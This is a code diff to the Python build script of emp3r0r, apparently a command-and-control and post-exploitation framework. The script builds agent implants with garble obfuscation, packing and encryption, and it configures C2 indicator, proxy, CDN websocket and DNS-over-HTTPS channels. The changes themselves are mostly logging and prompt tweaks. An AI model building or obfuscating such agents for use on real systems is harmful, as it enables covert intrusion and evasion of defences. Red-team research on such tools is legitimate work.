@@ -179,6 +179,7 @@ class GoBuild:
             return
 
         log_warn("GO BUILD starts...")
+        log_warn("------------------")
         build_target = f"../../build/{self.target}"
 
         if self.target == "agent":
@@ -191,19 +192,25 @@ class GoBuild:
 
         cmd = (
             f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0"""
-            + f""" go build -o {build_target} -ldflags='-s -w' -trimpath"""
+            + f""" go build -o {build_target} -ldflags='-s -w -v' -trimpath"""
         )
 
         # garble
 
-        if shutil.which("garble") and self.target != "cc" and args.garble:
+        if (
+            shutil.which("garble")
+            and self.target != "cc"
+            and yes_no("Use garble to obfuscate agent binary?")
+        ):
             cmd = (
                 f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE="""
                 + f""" garble -literals -tiny build -o {build_target} -ldflags="-v" -trimpath ."""
             )
+            log_warn("Using garble to build agent binary")
 
         os.system(cmd)
         log_warn("GO BUILD ends...")
+        log_warn("----------------")
 
         os.chdir("../../")
         self.unset_tags()
@@ -211,7 +218,7 @@ class GoBuild:
         targetFile = f"./build/{build_target.split('/')[-1]}"
 
         if os.path.exists(targetFile):
-            log_warn(f"{targetFile} generated")
+            log_success(f"{targetFile} generated")
         else:
             log_error("go build failed")
             sys.exit(1)
@@ -221,9 +228,11 @@ class GoBuild:
             os.system("make")
             shutil.move("loader.so", "../../core/build/loader.so")
             os.chdir("../../core")
-            log_warn("loader.so can be found under ./build")
+            log_success("loader.so can be found under ./build")
 
-        if self.target == "agent" and args.pack:
+        if self.target == "agent" and yes_no(
+            "Use packer to compress and encrypt agent binary?"
+        ):
             shutil.copy(targetFile, "../packer/agent")
             os.chdir("../packer")
             os.system("bash ./build.sh")
@@ -232,7 +241,7 @@ class GoBuild:
             os.chdir("../core")
             os.chmod(targetFile, 0o755)
 
-            log_warn(f"{targetFile} packed")
+            log_success(f"{targetFile} packed")
 
     def gen_certs(self):
         """
@@ -255,8 +264,7 @@ class GoBuild:
             os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
             os.chdir("..")
         except BaseException as exc:
-            log_error(
-                f"[-] Something went wrong, see above for details: {exc}")
+            log_error(f"[-] Something went wrong, see above for details: {exc}")
             sys.exit(1)
 
     def set_tags(self):
@@ -270,8 +278,7 @@ class GoBuild:
             shutil.copy("./lib/tun/api.go", "/tmp/api.go")
             shutil.copy("./lib/data/def.go", "/tmp/def.go")
         except BaseException:
-            log_error(
-                f"Failed to backup source files:\n{traceback.format_exc()}")
+            log_error(f"Failed to backup source files:\n{traceback.format_exc()}")
             sys.exit(1)
 
         # version
@@ -285,8 +292,7 @@ class GoBuild:
         sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
 
         # webroot
-        sed("./lib/tun/api.go", 'WebRoot = "emp3r0r"',
-            f'WebRoot = "{self.WebRoot}"')
+        sed("./lib/tun/api.go", 'WebRoot = "emp3r0r"', f'WebRoot = "{self.WebRoot}"')
 
         # opsep
         sed(
@@ -462,7 +468,7 @@ def clean():
                 if f.endswith("build.json"):
                     continue
                 os.remove(f)
-            print(" Deleted " + f)
+            log_success(" Deleted " + f)
         except BaseException:
             log_error(traceback.format_exc)
 
@@ -558,7 +564,7 @@ def main(target):
         return
 
     if target not in ("agent", "agentw"):
-        print("Unknown target")
+        log_error("Unknown target")
 
         return
 
@@ -571,8 +577,7 @@ def main(target):
         use_cached = yes_no(f"Use cached CC indicator ({indicator})?")
 
     if not use_cached:
-        indicator = input(
-            "CC status indicator URL (leave empty to disable): ").strip()
+        indicator = input("CC status indicator URL (leave empty to disable): ").strip()
         CACHED_CONF["cc_indicator"] = indicator
 
     if CACHED_CONF["cc_indicator"] != "":
@@ -594,20 +599,17 @@ def main(target):
     use_cached = False
 
     if "agent_proxy" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
+        use_cached = yes_no(f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
 
     if not use_cached:
-        agentproxy = input(
-            "Proxy server for agent (leave empty to disable): ").strip()
+        agentproxy = input("Proxy server for agent (leave empty to disable): ").strip()
         CACHED_CONF["agent_proxy"] = agentproxy
 
     # CDN
     use_cached = False
 
     if "cdn_proxy" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
+        use_cached = yes_no(f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
 
     if not use_cached:
         cdn = input("CDN websocket server (leave empty to disable): ").strip()
@@ -617,8 +619,7 @@ def main(target):
     use_cached = False
 
     if "doh_server" in CACHED_CONF:
-        use_cached = yes_no(
-            f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
+        use_cached = yes_no(f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
 
     if not use_cached:
         doh = input("DNS over HTTP server (leave empty to disable): ").strip()
@@ -645,6 +646,13 @@ def log_warn(msg):
     print in yellow
     """
     print("\u001b[33m" + msg + "\u001b[0m")
+
+
+def log_success(msg):
+    """
+    print in green
+    """
+    print("\u001b[32m" + msg + "\u001b[0m")
 
 
 def save(prev_h_len, hfile):
@@ -729,8 +737,7 @@ def get_version():
 # command line args
 yes_to_all = False
 
-parser = argparse.ArgumentParser(
-    description="Build emp3r0r CC/Agent bianaries")
+parser = argparse.ArgumentParser(description="Build emp3r0r CC/Agent bianaries")
 parser.add_argument(
     "--target", type=str, required=True, help="Build target, can be cc/agent/agentw"
 )
@@ -780,6 +787,8 @@ try:
     atexit.register(save, h_len, histfile)
 
     main(args.target)
+    yes_no(f"{args.target} successfully built, goodbye?")
+
 except (KeyboardInterrupt, EOFError, SystemExit):
     sys.exit(0)
 except BaseException:
